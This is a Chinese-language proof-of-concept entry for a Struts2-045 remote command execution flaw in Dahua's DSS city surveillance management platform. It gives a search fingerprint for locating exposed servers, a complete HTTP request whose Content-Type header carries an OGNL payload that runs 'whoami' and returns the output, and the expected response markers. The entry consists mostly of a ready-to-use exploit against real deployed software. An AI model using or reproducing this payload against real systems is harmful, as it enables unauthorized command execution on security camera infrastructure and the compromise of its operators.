﻿# 大华城市安防监控系统平台管理 DSS Struct2-045

> 更新时间：2023-12-16

> 漏洞编号：

> 漏洞说明：大华城市安防监控系统平台管理 DSS 登录接口存在 Struct2-045漏洞，可执行系统命令并回显。

> 漏洞特征：body="/portal/include/script/dahuaDefined/headCommon.js?type=index"&&title="DSS"

> 验证脚本：HTTP

```
GET /admin/login_login.action HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Connection: close
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
Connection: close
```

> 响应代码特征：200

> 响应内容特征：root

> 上传文件定位：


> 验证文件来源：大华城市安防监控系统平台管理 DSS Struct2-045.poc
